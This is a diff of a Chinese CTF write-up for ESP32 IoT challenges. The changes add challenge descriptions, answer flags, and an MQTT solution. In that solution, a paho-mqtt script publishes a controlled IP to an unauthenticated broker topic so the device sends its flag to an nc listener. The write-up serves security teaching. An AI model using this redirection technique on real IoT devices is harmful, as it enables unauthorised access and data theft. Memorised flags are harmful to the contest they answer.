@@ -1,12 +1,12 @@
 # ESP32 CTF 清华校赛版本
 
-解题的总体思路是通过对隐去flag的源码分析应该如何获取flag，另外在源码中为了清晰阅读，直接采用include c文件分离不同方向题目代码，省掉头文件。
+解题的总体思路是通过对隐去flag的源码分析应该如何获取flag。并且在真实板子上的代码中，采用了动态aes解密真flag的方式，防止选手通过读取固件直接获得所有明文flag。另外在源码中为了清晰阅读，直接采用include c文件分离不同方向题目代码，省掉了头文件。
 
 ## 硬件题目
 
 > main/hardware.c
 
-题目开启顺序：
+主要考察了对于GPIO、串口通信的理解以及操作，题目开启顺序：
 
 ```
 task1 -> task2 -> task3
@@ -66,7 +66,7 @@ THUCTF{UART_15_v3ry_imp0r7ant_1n_i0T}
 
 > main/network.c
 
-题目开启顺序：
+主要考察对设备网络通信的使用，分析，捕获，题目开启顺序：
 
 ```
         -> task2 
@@ -102,6 +102,10 @@ THUCTF{M4k3_A_w1rele55_h0t5p0ts}
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174710945.png?raw=true)
 
+```
+THUCTF{Sn1ffer_N3tw0rk_TrAffic_In_7h4_Main_r0aD}
+```
+
 ### task3
 
 - 题目：flag在空中
@@ -125,16 +129,20 @@ THUCTF{M4k3_A_w1rele55_h0t5p0ts}
 ➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 1 
 ```
 
+```
+THUCTF{Y0u_cAn_s3nd_4nd_sNiff3r_802.11_r4w_pAckag3}
+```
+
+
 ## 蓝牙题目
 
 > main/bluetooth.c
 
-题目开启顺序：
+主要考察对经典蓝牙，低功耗蓝牙的基本操作以及分析，题目开启顺序：
 
 ```
 task1 -> task2 -> task3
 ```
-
 
 ### task1
 
@@ -183,18 +191,17 @@ THUCTF{AdVD47a}
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174742131.png?raw=true)
 
-
 ```
-I (389661) GATT: GATT_WRITE_EVT, conn_id 0, trans_id 1, handle 42
-I (389661) GATT: GATT_WRITE_EVT, value len 15, value :
-I (389671) GATT: 54 48 55 43 54 46 7b 41 64 56 44 34 37 61 7d 
-[+] bluetooth task III : THUCTF{AdVD47a}
-[+] bluetooth task III : you can read the third flag this time
+THUCTF{WrItE_4_gA7T}
 ```
 
 ## MQTT
 
 > main/mqtt.c
+
+主要考察对MQTT协议存在的未授权未认证的弱点，以及空中跳跃的攻击模型，推荐阅读：
+
+- [物联网设备消息总线机制的使用及安全问题](https://gtrboy.github.io/posts/bus/)
 
 题目开启顺序：
 
@@ -256,14 +263,21 @@ client.loop_forever()
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175056665.png?raw=true)
 
 
-```
+```python
 import paho.mqtt.client as mqtt
 
 client = mqtt.Client()
 client.connect("mqtt.esp32ctf.xyz",1883,60)
-client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
-
+client.publish("/topic/flag2/tdzloj","49.233.20.19")
 ```
+
+```python
+ubuntu@VM-16-6-ubuntu:~$ sudo nc -l -p 80
+GET / HTTP/1.0
+User-Agent: esp-idf/1.0 esp32
+flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel} 
+```
+
 ### task3
 
 - 题目：分析GATT业务并获得flag
@@ -271,7 +285,6 @@ client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
 
 
 ![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175117275.png?raw=true)
-
 
 
 ```python
@@ -287,7 +300,7 @@ client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")
 print(io.recv())                 
 ```
 
-```
+```python
 ubuntu@VM-16-6-ubuntu:~$ sudo python3 exp.py 
 [+] Trying to bind to :: on port 80: Done
 [+] Waiting for connections on :::80: Got connection from ::ffff:61.148.244.254 on port 64616
